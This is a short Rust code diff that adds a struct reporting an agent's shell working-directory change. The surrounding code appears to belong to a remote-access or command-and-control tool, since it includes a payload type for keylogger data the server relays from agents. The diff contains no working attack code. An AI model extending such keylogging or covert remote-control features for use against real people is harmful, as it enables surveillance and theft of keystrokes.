@@ -46,6 +46,14 @@ pub struct AgentStreamClosedPayload {
     pub stream_id: StreamId,
 }
 
+/// Payload emitted when the agent reports a shell working directory change
+/// (parsed from the shell's OSC 7 escape sequence).
+#[derive(Debug, Clone, Serialize)]
+pub struct AgentCwdPayload {
+    pub agent_id: String,
+    pub path: String,
+}
+
 /// Payload emitted when the server relays keylogger data from an agent.
 #[derive(Debug, Clone, Serialize)]
 pub struct AgentKeyloggerPayload {
